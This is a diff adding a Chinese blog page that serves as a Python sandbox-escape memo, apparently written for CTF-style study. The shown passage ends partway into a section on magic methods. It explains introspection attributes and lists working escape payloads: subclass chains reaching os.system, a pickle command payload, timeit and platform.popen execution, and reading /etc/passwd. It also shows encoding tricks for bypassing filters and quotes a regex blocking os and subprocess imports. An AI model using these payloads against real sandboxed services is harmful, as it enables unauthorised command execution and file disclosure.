@@ -1,0 +1,1216 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/warning.png">
+  <link rel="icon" href="/img/icon/warning.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）1.func_globals返回包含函数全局变量的字典的引用————————定义函数的模块的全局命名空间。function.func_globals &gt;&gt;&gt; def foo(): pass ... &gt;&gt;&gt; foo.func_globals &#123;&#39;__builtins__&#39;: &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python 沙盒逃逸备忘">
+<meta property="og:url" content="http://example.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）1.func_globals返回包含函数全局变量的字典的引用————————定义函数的模块的全局命名空间。function.func_globals &gt;&gt;&gt; def foo(): pass ... &gt;&gt;&gt; foo.func_globals &#123;&#39;__builtins__&#39;: &amp;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2018-05-04T20:39:18.000Z">
+<meta property="article:modified_time" content="2025-01-24T15:19:07.554Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="网络安全 沙盒逃逸 Python">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Python 沙盒逃逸备忘 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>K0rz3n&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/icemountain.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Python 沙盒逃逸备忘"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2018-05-04 21:39" pubdate>
+          May 4, 2018 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          45 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Python 沙盒逃逸备忘</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）"><a href="#一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）" class="headerlink" title="一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）"></a>一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）</h2><h3 id="1-func-globals"><a href="#1-func-globals" class="headerlink" title="1.func_globals"></a>1.func_globals</h3><p>返回包含函数全局变量的字典的引用————————定义函数的模块的全局命名空间。<br>function.func_globals</p>
+<pre><code class="hljs">&gt;&gt;&gt; def foo(): pass
+...
+&gt;&gt;&gt; foo.func_globals
+&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;foo&#39;: &lt;function     foo at 0x7f3a056c7938&gt;, &#39;__doc__&#39;: None, &#39;__package__&#39;: None&#125;
+</code></pre>
+<span id="more"></span>
+
+<h3 id="2-getattribute"><a href="#2-getattribute" class="headerlink" title="2.__getattribute__"></a>2.<code>__getattribute__</code></h3><p>被调用无条件地实现类的实例的属性访问。</p>
+<p>object. <strong>getattribute</strong>(self, name)<br>1）self 必需的。类的实例，在调用时自动传递。<br>2）name 必需的。属性的名称。</p>
+<pre><code class="hljs">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)
+</code></pre>
+<h3 id="3-dict"><a href="#3-dict" class="headerlink" title="3.__dict__"></a>3.<code>__dict__</code></h3><p>模块对象有一个由dictionary对象实现的名称空间(这是由模块中定义的函数的func_globals属性引用的字典)。属性引用在本词典中被翻译为查找，例如，<br>m.x相当于m.<strong>dict</strong> [“x”]。</p>
+<pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__dict__[&#39;upper&#39;]  
+&lt;method &#39;upper&#39; of &#39;str&#39; objects&gt;
+
+&gt;&gt;&gt; &#39;&#39;.__class__.upper
+&lt;method &#39;upper&#39; of &#39;str&#39; objects&gt;
+</code></pre>
+<h3 id="4-dir"><a href="#4-dir" class="headerlink" title="4.dir()"></a>4.dir()</h3><p>将显示对象的属性的名称，<code>__dict__</code>是dir()的子集<br>dir ([object])</p>
+<pre><code class="hljs">&gt;&gt;&gt; dir(&#39;&#39;.__class__)
+[&#39;__add__&#39;, &#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__getnewargs__&#39;, &#39;__getslice__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__mod__&#39;, &#39;__mul__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__rmod__&#39;, &#39;__rmul__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;_formatter_field_name_split&#39;, &#39;_formatter_parser&#39;, &#39;capitalize&#39;, &#39;center&#39;, &#39;count&#39;, &#39;decode&#39;, &#39;encode&#39;, &#39;endswith&#39;, &#39;expandtabs&#39;, &#39;find&#39;, &#39;format&#39;, &#39;index&#39;, &#39;isalnum&#39;, &#39;isalpha&#39;, &#39;isdigit&#39;, &#39;islower&#39;, &#39;isspace&#39;, &#39;istitle&#39;, &#39;isupper&#39;, &#39;join&#39;, &#39;ljust&#39;, &#39;lower&#39;, &#39;lstrip&#39;, &#39;partition&#39;, &#39;replace&#39;, &#39;rfind&#39;, &#39;rindex&#39;, &#39;rjust&#39;, &#39;rpartition&#39;, &#39;rsplit&#39;, &#39;rstrip&#39;, &#39;split&#39;, &#39;splitlines&#39;, &#39;startswith&#39;, &#39;strip&#39;, &#39;swapcase&#39;, &#39;title&#39;, &#39;translate&#39;, &#39;upper&#39;, &#39;zfill&#39;]
+</code></pre>
+<h3 id="5-base"><a href="#5-base" class="headerlink" title="5.__base__"></a>5.<code>__base__</code></h3><p>每个类都有一个<code>__base__</code>属性能列出器基类<br><strong>注意：</strong><code>__base__</code> 和 <code>__bases__</code>的区别<br>他们都是返回当前类的基类，只不过<code>__bases__</code>返回的是一个元祖</p>
+<pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__base__
+&lt;type &#39;basestring&#39;&gt;
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__
+(&lt;type &#39;basestring&#39;&gt;,)
+</code></pre>
+<h3 id="6-mro"><a href="#6-mro" class="headerlink" title="6.__mro__"></a>6.<code>__mro__</code></h3><p>递归地显示父类一直到 object </p>
+<pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
+(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)
+</code></pre>
+<h3 id="7-subclasses"><a href="#7-subclasses" class="headerlink" title="7.__subclasses__()[]"></a>7.<code>__subclasses__</code>()[]</h3><p>获取子类</p>
+<pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40]
+&lt;type &#39;file&#39;&gt;
+</code></pre>
+<h3 id="8-import"><a href="#8-import" class="headerlink" title="8.__import__"></a>8.<code>__import__</code></h3><p>import 一个模块</p>
+<p><code>__import__</code> (name)</p>
+<pre><code class="hljs">&gt;&gt;&gt; __import__(&#39;os&#39;)
+&lt;module &#39;os&#39; from &#39;/usr/lib/python2.7/os.pyc&#39;&gt;
+</code></pre>
+<h3 id="9-bulitin"><a href="#9-bulitin" class="headerlink" title="9.__bulitin__"></a>9.<code>__bulitin__</code></h3><p>Python的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀<br>在Python2.X版本中，内建模块被命名为<code>__builtin__</code>，而到了Python3.X版本中，却更名为builtins。</p>
+<h3 id="10-builtins"><a href="#10-builtins" class="headerlink" title="10.__builtins__"></a>10.<code>__builtins__</code></h3><p>是对内建模块的一个引用<br>这个和<code> __builtin__</code>有一些区别</p>
+<p>1）无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入<code>__builtin__</code>内建模块;而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，可以把它当作内建模块直接使用</p>
+<p>2）<code>__builtins__</code>虽是对内建模块的引用，但这个引用要看是使用<code>__builtins__</code>的模块是哪个模块</p>
+<pre><code class="hljs">① 在主模块__main__中：
+__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此
+
+② 在__main__模块中：
+__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身。它在任何地方都可见。此时__builtins__的类型是字典。
+</code></pre>
+<h3 id="11-reload"><a href="#11-reload" class="headerlink" title="11.reload"></a>11.reload</h3><p>重新加载之前导入的模块<br>reload (module)</p>
+<pre><code class="hljs">&gt;&gt;&gt; import sys
+
+&gt;&gt;&gt; reload(sys)
+&lt;module &#39;sys&#39; (built-in)&gt;
+</code></pre>
+<h3 id="12-getattr"><a href="#12-getattr" class="headerlink" title="12.getattr"></a>12.getattr</h3><p>返回对象的命名属性的值。<br>getattr (object, name)<br>相当于 object.name<br>name 必须是一个字符串</p>
+<pre><code class="hljs">&gt;&gt;&gt; class A():
+...     bar =1
+...
+
+&gt;&gt;&gt; a = A()
+
+&gt;&gt;&gt; getattr(a,&#39;bar&#39;)
+1
+</code></pre>
+<h3 id="13-getattr"><a href="#13-getattr" class="headerlink" title="13.__getattr__"></a>13.<code>__getattr__</code></h3><p>当属性查找没有在通常的位置找到属性时调用(例如，它不是实例属性，也不是在类树中找到self)</p>
+<h3 id="14-name"><a href="#14-name" class="headerlink" title="14.__name__"></a>14.<code>__name__</code></h3><p>这个值获得的只是一个字符串，不是模块的引用<br>要使用sys.modules[<code>__name__</code>]才获得的是模块的引用</p>
+<pre><code class="hljs">&gt;&gt;&gt; sys.modules[&#39;__main__&#39;]
+&lt;module &#39;__main__&#39; (built-in)&gt;
+</code></pre>
+<h3 id="15-func-code"><a href="#15-func-code" class="headerlink" title="15.func_code"></a>15.func_code</h3><p>返回表示已编译函数体的代码对象。</p>
+<pre><code class="hljs">function.func_code
+
+&gt;&gt;&gt; def foo():
+...     a=1
+...
+
+&gt;&gt;&gt; foo.func_code
+&lt;code object foo at 0x7f3a0570d930, file &quot;&lt;stdin&gt;&quot;, line 1&gt;
+</code></pre>
+<p>**注意：**这个代码对象必须存在几个参数</p>
+<p>co_argcount  这个参数是返回该函数的参数</p>
+<pre><code class="hljs">&gt;&gt;&gt; foo.func_code.co_argcount
+0    
+</code></pre>
+<p>co_code 返回函数的字节码（可用dis.dis（字节码）将其转换为汇编格式）</p>
+<pre><code class="hljs">&gt;&gt;&gt; foo.func_code.co_code
+&#39;d\x01\x00&#125;\x00\x00d\x00\x00S&#39;
+</code></pre>
+<h3 id="16-timeit-模块"><a href="#16-timeit-模块" class="headerlink" title="16.timeit 模块"></a>16.timeit 模块</h3><p>这个模块是用来测试代码的执行时间的，能执行代码自然能执行命令<br>使用前需要导入timeit</p>
+<p>使用：</p>
+<p>timeit(命令，number&#x3D;1)</p>
+<pre><code class="hljs">&gt;&gt;&gt; import timeit
+&gt;&gt;&gt; timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;dir&#39;)&quot;,number=1)
+</code></pre>
+<p>其中命令是字符串的形式</p>
+<h3 id="17-platform-模块"><a href="#17-platform-模块" class="headerlink" title="17.platform 模块"></a>17.platform 模块</h3><p>由名字可以知道这个模块和平台有关，里面的函数主要是为了返回和平台的一些信息，但是我们还是可以调用<br>popen 这个函数执行命令</p>
+<pre><code class="hljs">print platform.popen(&#39;命令&#39;,mode=&#39;r&#39;,bufsize= -1).read()
+</code></pre>
+<h3 id="18-globals"><a href="#18-globals" class="headerlink" title="18.__globals__"></a>18.<code>__globals__</code></h3><p><code>function.__globals__</code> 等同于globals()，dir() 的结果是上面两个的键值<br>在fuzz 中常常和 <code>__init__</code>配合使用,<code>__init__</code> 一般跟在类的后面，相当于实例化这个类</p>
+<pre><code class="hljs"> [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)
+</code></pre>
+<h3 id="19-call"><a href="#19-call" class="headerlink" title="19.__call__"></a>19.<code>__call__</code></h3><p>使实例能够像函数一样被调用<br> x.<strong>call</strong> 等同于 x()</p>
+<pre><code class="hljs">&gt;&gt;&gt; func.__call__
+&lt;method-wrapper &#39;__call__&#39; of function object at 0x7f3a056c7e60&gt;
+</code></pre>
+<h3 id="20-pickle"><a href="#20-pickle" class="headerlink" title="20.pickle"></a>20.pickle</h3><p>这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化</p>
+<p>基本的语法：<br>序列化：</p>
+<pre><code class="hljs">import pickle
+test=(&#39;this is a test&#39;,3.14,[1,2,3,&quot;hh&quot;])
+p=pickle.dumps(test)
+</code></pre>
+<p>反序列化：</p>
+<pre><code class="hljs">n=pickle.loads(p)
+</code></pre>
+<p>我们可以通过 pickle 的方式加载命令</p>
+<pre><code class="hljs">pickle.loads(b&quot;cos\nsystem\n(S&#39;ls&#39;\ntR.&quot;)
+</code></pre>
+<h3 id="21-os-subprocess-commands"><a href="#21-os-subprocess-commands" class="headerlink" title="21.os&#x2F;subprocess&#x2F;commands"></a>21.os&#x2F;subprocess&#x2F;commands</h3><pre><code class="hljs">os.system(&#39;ifconfig&#39;)
+os.popen(&#39;ifconfig&#39;)
+commands.getoutput(&#39;ifconfig&#39;)
+commands.getstatusoutput(&#39;ifconfig&#39;)
+subprocess.call([&#39;ifconfig&#39;],shell=True)
+</code></pre>
+<p>这里重点说一下subprocess 吧<br>1.subprocess.run()<br>Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</p>
+<p>2.subprocess.call()<br>执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</p>
+<p>3.subprocess.check_call()<br>Python 2.5中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check&#x3D;True)。</p>
+<p>4.subprocess.check_output()<br>Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。</p>
+<p>5.subprocess.getoutput(cmd)<br>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p>
+<p>6.subprocess.getstatusoutput(cmd)<br>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。</p>
+<h3 id="22-eval-exec-execfile"><a href="#22-eval-exec-execfile" class="headerlink" title="22.eval&#x2F;exec&#x2F;execfile"></a>22.eval&#x2F;exec&#x2F;execfile</h3><p>1.eval(expression):<br>返回python 表达式执行的结果</p>
+<p>2.exec(source)<br>动态执行python代码。也就是说exec可以执行复杂的python代码，而不像eval函数那样只能计算一个表达式的值。exec函数的返回值永远为None。</p>
+<p>3.execfile(filename)<br>执行一个文件的内容<br>文件是将被解析为python序列的类似于模块的文件</p>
+<h3 id="23-importlib模块"><a href="#23-importlib模块" class="headerlink" title="23.importlib模块"></a>23.importlib模块</h3><pre><code class="hljs">import importlib
+
+importlib.import_module(module)
+</code></pre>
+<p>他可以代替import 非常好</p>
+<h2 id="二、什么是python-的沙箱逃逸"><a href="#二、什么是python-的沙箱逃逸" class="headerlink" title="二、什么是python 的沙箱逃逸"></a>二、什么是python 的沙箱逃逸</h2><p>所谓的沙箱逃逸就是从一个被阉割和做了严格限制的python执行环境中获取到更高的权限,甚至getshell,这是我们的最终的目的，但是实现这个目标之前我们必须解决的就是如何绕过重重的waf去使用python执行命令</p>
+<p>python 能执行命令或者存在执行命令功能的函数是一定的，但是他的存在形式是多样的，他过滤了这种形式我们就换一种形式表示，正所谓<strong>曲线救国</strong></p>
+<h2 id="三、攻与防的战争"><a href="#三、攻与防的战争" class="headerlink" title="三、攻与防的战争"></a>三、攻与防的战争</h2><p>简单的梳理一下思路：</p>
+<p>1.我们想直接引入执行命令的模块os等<br>遭遇过滤：</p>
+<pre><code class="hljs">re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)
+</code></pre>
+<p>2.我们不直接使用import 用<code>__import__()</code>取而代之<br>遭遇过滤：<code>__import__(module)</code></p>
+<p>3.我们不直接用<code>__import__(module)</code> 转换编码<br><code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code><br>遭遇过滤<code>__import__</code></p>
+<p>4.不用<code>__import__</code>行不行？当然可以，我们有内建函数直接调用<br><code>__bulitin__</code>&#x2F;<code> __bulitins__</code><br>常见的一些危险的函数都是<code>__builtin__</code>里面的，我们可以直接用 eval() exec() execfile()<br>遭遇过滤：把<code>__builtin__</code> 中的危险函数都del掉，看你怎么绕</p>
+<p>5.reload() 函数重新加载完整的没有阉割的<code>__builtin__</code><br>reload(<code>__builtin__</code>)<br>遭遇过滤：reload()也是一个内建函数，如果我们在<code>__builtin__</code>中把reload()也del掉呢？</p>
+<p>6.imp模块也是一个可以引入东西的一个模块<br>import imp<br>imp.reload(<code>__builtin__</code>)<br>再次成功引入<br>遭遇过滤：看来还是没有从源头del干净，我们知道python 的模块其实都存放在sys.modules中，不要啥就删啥。</p>
+<pre><code class="hljs">sys.modules[&#39;os&#39;]=None
+</code></pre>
+<p>这样就OK了</p>
+<p>7.这回问题有点棘手，要知道如何应对还要仔细分析一下import的步骤<br>import 的步骤：</p>
+<p>1）如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>2）如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p>
+<p>那我们可以向更源头追溯<br>我们都知道任何的模块归根道理都是文件，只要文件还在，我们就一定有办法！<br>比如类unix 的系统中，os 模块的路径一般都是&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py，那我们就直接写这个</p>
+<pre><code class="hljs">import sys
+
+sys.modules[&#39;os&#39;] = &#39;/usr/lib/python2.7/os.py&#39;
+
+import os
+</code></pre>
+<p>遭遇过滤：我把你sys也一并del，让你用！哼</p>
+<p>8.和上面一样的思路，文件还在我们就直接用文件，import 的本质就是把对应的模块文件执行一遍</p>
+<pre><code class="hljs">execfile(&#39;/usr/lib/python2.7/os.py&#39;)
+
+system(&#39;cat /etc/passwd&#39;)
+</code></pre>
+<p>遭遇过滤：execfile() 别用了</p>
+<p>9.那我用文件读取函数读入文件，然后再exec() 也能实现一样的效果</p>
+<p>遭遇过滤：不耐烦了，我也不过滤了，直接删文件</p>
+<p>10.这样的话，我就想起了，没有编译器手写编译器的梗，这里完全可以用嘛。。。。<br>但是这样鲁莽地删除关键函数文件是很危险的，很容易出现莫名的依赖问题，不推荐使用</p>
+<p>好家伙。。。。这一串攻防对决真的是非常的精彩了，淋漓尽致地展现了攻与防的较量</p>
+<h2 id="四、整理一些小trick"><a href="#四、整理一些小trick" class="headerlink" title="四、整理一些小trick"></a>四、整理一些小trick</h2><p>1.完整过滤整个匹配语句我们只要使用变量替换的方式绕过</p>
+<pre><code class="hljs">a = open
+print(a(&quot;/etc/passwd&quot;).read())
+</code></pre>
+<p>2.函数名后面加点空格换一行都能执行</p>
+<pre><code class="hljs">print open
+(&quot;/etc/passwd&quot;).read()
+</code></pre>
+<p>3.使用第三方库的执行命令的函数<br>如果程序中调用了第三方的库，恰好这个库有执行命令的函数，那么肯定是再好不过了</p>
+<pre><code class="hljs">from numpy.distutils.exec_command import _exec_command as system
+system(&quot;ls /&quot;)
+</code></pre>
+<p>4.使用别名</p>
+<pre><code class="hljs">import os as o
+</code></pre>
+<p>5.字符串拼接</p>
+<pre><code class="hljs">&quot;l&quot;+&quot;s&quot;
+&quot;func_global&quot;+&quot;s&quot;
+</code></pre>
+<p>6.字符串编码或者其他操作<br>如果过滤的是键值对中的key(为了强调是字符串类型)<br>方法一：使用编码的转换</p>
+<pre><code class="hljs">&#39;X19pbXBvcnRfXw==&#39;.decode(&#39;base64&#39;)
+</code></pre>
+<p>方法二：使用python的字符串操作</p>
+<pre><code class="hljs">s = &quot;emit&quot;
+s = s [::-1]
+print a[s]
+</code></pre>
+<h2 id="五、魔法方法"><a href="#五、魔法方法" class="headerlink" title="五、魔法方法"></a>五、魔法方法</h2><p>这节是基于之前我开始讲的那些基本的概念和语法的，如果不了解还是请往第一节看，这个很重要，因为这个大概就是曲线救国的精髓了</p>
+<h3 id="1-魔法方法简介"><a href="#1-魔法方法简介" class="headerlink" title="1.魔法方法简介"></a>1.魔法方法简介</h3><p>传说，Python 天生体内就拥有着王的印记，它们总是被双下划线包围，他们是面向对象的python的灵魂， 国难当头他们就被激发出来，曲线救国……</p>
+<p>所谓曲线救国的“曲线”,就是对方封锁了从山下上半山腰营地的道路，那我们可以偷偷从山背后上山到山顶，然后从山顶下到半山腰的营地偷袭。</p>
+<h4 id="2-一切皆对象的py"><a href="#2-一切皆对象的py" class="headerlink" title="2.一切皆对象的py"></a>2.一切皆对象的py</h4><p>我们看看python是怎么一切皆对象的</p>
+<pre><code class="hljs">&gt;&gt;&gt; type([])
+&lt;type &#39;list&#39;&gt;
+
+&gt;&gt;&gt; type(1)
+&lt;type &#39;int&#39;&gt;
+
+&gt;&gt;&gt; type(1.1)
+&lt;type &#39;float&#39;&gt;
+
+&gt;&gt;&gt; type(&#39;&#39;)
+&lt;type &#39;str&#39;&gt;
+
+&gt;&gt;&gt; type(())
+&lt;type &#39;tuple&#39;&gt;
+
+&gt;&gt;&gt; type(&#123;&#125;)
+&lt;type &#39;dict&#39;&gt;
+</code></pre>
+<p>这些类型都是对象，我现在就以 <code>&#39;&#39;</code> 为例</p>
+<p>1)我们可以从一个对象实例向上追溯到他的类<br><code>&#39;&#39;.__class__</code></p>
+<pre><code class="hljs">&gt;&gt;&gt; type(&#39;&#39;.__class__)
+&lt;type &#39;type&#39;&gt;
+</code></pre>
+<p>2)我们从他的类向上追溯到他的基类，直至object根类</p>
+<p>①多次使用<code>__base__</code> 或者 <code>__bases__</code></p>
+<pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__base__
+&lt;type &#39;basestring&#39;&gt;
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__base__
+&lt;type &#39;object&#39;&gt;
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__[0]
+&lt;type &#39;basestring&#39;&gt;
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__[0].__bases__[0]
+&lt;type &#39;object&#39;&gt;
+
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__
+(&lt;type &#39;basestring&#39;&gt;,)
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__.__class__
+&lt;type &#39;tuple&#39;&gt;
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__.__class__.__bases__[0]
+&lt;type &#39;object&#39;&gt;
+</code></pre>
+<p>②直接使用<code>__mro__</code></p>
+<pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
+(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2]
+&lt;type &#39;object&#39;&gt;
+</code></pre>
